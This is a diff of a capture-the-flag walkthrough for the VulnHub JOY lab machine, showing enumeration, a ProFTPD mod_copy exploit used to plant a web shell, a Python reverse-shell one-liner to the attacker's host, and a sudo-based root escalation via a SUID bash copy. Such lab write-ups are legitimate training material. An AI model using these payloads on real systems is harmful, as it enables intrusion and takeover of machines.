@@ -11,7 +11,9 @@ image:
 ---
 
 # Recon
+
 ## NMAP Complete Scan
+
 ``` 
 # Nmap 7.92 scan initiated Fri Feb 11 18:02:47 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Digitalworld.local-JOY/192.168.110.26/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Digitalworld.local-JOY/192.168.110.26/scans/xml/_full_tcp_nmap.xml 192.168.110.26
 Nmap scan report for 192.168.110.26
@@ -338,6 +340,7 @@ OS and Service detection performed. Please report any incorrect results at https
 ## TCP/21 (FTP)
 
 ### NMAP 
+
 ``` 
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY]
 └─# nmap $ip -p 21 -sV -sC
@@ -349,14 +352,19 @@ PORT   STATE SERVICE VERSION
 MAC Address: 08:00:27:2E:3C:B7 (Oracle VirtualBox virtual NIC)
 Service Info: Host: The
 ```
+
 - `ProFTPD`
 
 ## TCP/80 (HTTP)
+
 ### FFUF
+
 - No directories enumerated
 
 ## TCP/139,445 (SMB)
+
 ### SMBMap
+
 ```
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26]
 └─# smbmap -H $ip -u '' -p ''
@@ -366,10 +374,13 @@ Service Info: Host: The
 	print$                                            	NO ACCESS	Printer Drivers
 	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.12-Debian)
 ```
+
 - No accessible fileshare
 
 ## UDP/161 (SNMP)
+
 ### NMAP
+
 ```
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp]
 └─# nmap -vv --reason -Pn -T4 -sU -sV -p 161 "--script=banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" $ip 
@@ -458,19 +469,17 @@ SNIP
 SNIP
 
 ```
+
 - `TCP/36969`
 	- `--listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick`
 	- nmap scan did not detect `TCP/36969`
 
-
-
-
 # Initial Foothold
-
 
 ## TCP/21 (FTP)
 
 1. Access FTP w/ anonymous account, check for write access
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot]
 	└─# touch test
@@ -491,13 +500,17 @@ SNIP
 	226 Transfer complete
 	ftp> 
 	```
+
 	- We have write access
 2. Download all files
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp]
 	└─# wget -m --no-passive ftp://anonymous:anonymous@$ip #Download all
 	```
+
 3. View directory structure of downloaded files
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp]
 	└─# tree -a 192.168.110.26/
@@ -529,6 +542,7 @@ SNIP
 		├── project_zoo
 		└── reminder
 	```
+
 4. View downloaded files
 	- `directory`
 		![](Pasted%20image%2020220211190947.png)
@@ -538,6 +552,7 @@ SNIP
 		![](Pasted%20image%2020220211191126.png)
 		- Could be used as a password list
 5. Check for if ProFTPD is vulnerable to `CVE-2015-3306`
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot]
 	└─# nc $ip 21
@@ -547,6 +562,7 @@ SNIP
 	site cpto /tmp/passwd
 	250 Copy successful
 	```
+
 	- It is vulnerable
 	- Most likely, we have to exploit this vulnerability to obtain RCE, possible ways to gain initial access
 		1. We can upload a web shell via FTP (we have write access) & use the exploit to copy it into the web directory?
@@ -556,12 +572,16 @@ SNIP
 		- Vulnhub: [Symfonos2](https://yufongg.github.io/posts/Symfonos-2/#tcp21-ftp---proftpd-135-file-copy) 
 
 ## TCP/36969 (TFTP)
+
 1. Extract filenames from `directory`
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp/192.168.110.26/upload]
 	└─# cat directory | awk '{print $9}' > files.txt
 	```
+
 2. Create [script](https://unix.stackexchange.com/a/76429) to download all files
+
 	```
 	#!/bin/bash
 
@@ -575,12 +595,16 @@ SNIP
 		curl -o "$path" "$server/$path"
 	done < "$1"
 	```
+
 3. Download all files via TFTP
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp/192.168.110.26/upload]
 	└─# ./download.sh files.txt "192.168.110.26:36969"
 	```
+
 4. View directory structure of downloaded files
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot]
 	└─# tree -a tftp/
@@ -638,8 +662,10 @@ SNIP
 	├── zpraNtovt6tQbYIUebAQLXhKsV4izRLZOj3NIqhR50A5ZHNhcEXdtxtWPZDJJbhJ.txt
 	└── ZsUbbJTgvZ1WMcgS2JrA11QjneeUOaDNAXkklrCLTHXv9UdAymqWVcCHyUlwAh2a.txt
 	```
+
 5. View downloaded files
 	- Compiled 
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/tftp]
 	└─# mkdir script
@@ -649,18 +675,28 @@ SNIP
 	└─# cat * >> compiled.txt
 	cat: script: Is a directory
 	```
+
 	![](Pasted%20image%2020220211193011.png)
+
 		- `ProFTPd 1.3.5`
+
 		- `/var/www/tryingharderisjoy`
+
 		- We are able to insert a webshell into `/var/www/tryingharderisjoy` 
 
 ## TCP/21 (FTP) - ProFTPD 1.3.5 Exploit
+
 1. Search exploits for `ProFTPd 1.3.5`
 	
+
 	| Exploit Title                                           | Path |
+
 	| ------------------------------------------------------- | ---- |
+
 	| ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.py     |
+
 2.  Manual exploit
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/exploit]
 	└─# nc $ip 21
@@ -676,31 +712,36 @@ SNIP
 	QUIT
 	221 Goodbye.
 	```
+
 	- Created a webshell
 
-
-
-
 ## TCP/80 (HTTP) - Webshell
+
 1. Execute commands
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/exploit]
 	└─# curl http://192.168.110.26/web_shell.php?c=id
 	proftpd: 192.168.110.4:47940: SITE cpto uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
 	```
+
 2. Obtain a www-data shell
+
 	```
 	# Enter this in your web browser
 	192.168.110.26/web_shell.php?c=python+-c+'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.110.4",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
 	```
-	![](Pasted%20image%2020220211202415.png)
-	![](Pasted%20image%2020220211202212.png)
 
+	![](Pasted%20image%2020220211202415.png)
+
+	![](Pasted%20image%2020220211202212.png)
 
 # Privilege Escalation
 
 ## Patrick - Via Creds Found
+
 1. Found credentials at `/ossec/patricksecretsofjoy`
+
 	```
 	patrick@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy 
 	credentials for JOY:
@@ -709,12 +750,14 @@ SNIP
 
 	how would these hack3rs ever find such a page?
 	```
+
 2. Switch to patrick w/ patrick:apollo098765
 	![](Pasted%20image%2020220211203155.png)
 
-
 ## Root - Via Sudo 
+
 1. Check for sudo access
+
 	``` 
 	patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l
 	Matching Defaults entries for patrick on JOY:
@@ -724,8 +767,10 @@ SNIP
 		(ALL) NOPASSWD: /home/patrick/script/test
 	patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
 	```
+
 2. The script allows user to specify a file/directory to change permission, we can exploit it by changing the permission of the entire `/home/patrick/script/` directory into world writable, readable and executable.
 3. Exploit by changing permission of `/home/patrick/script/`
+
 	```
 	patrick@JOY:~$ sudo /home/patrick/script/test
 	I am practising how to do simple bash scripting!
@@ -738,15 +783,20 @@ SNIP
 	Done!
 	patrick@JOY:~$ cd script
 	```
+
 4. Replace `test` w/ bash script to create a root shell
+
 	```
 	patrick@JOY:~/script$ rm test
 	patrick@JOY:~/script$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > test; chmod 4777 test;
 	```
+
 5. Obtain root shell
+
 	``` 
 	patrick@JOY:~/script$ /tmp/rootbash -p
 	```
+
 	![](Pasted%20image%2020220211203950.png)
 
 6. Root Flag
@@ -775,6 +825,3 @@ SNIP
 	P.S. Someone asked me, also, about "shesmileslikeabrightsmiley". Yes, indeed, she smiles like a bright smiley. She makes me smile like a bright smiley too? :-)
 	rootbash-4.4# 
 	```
-
-
-
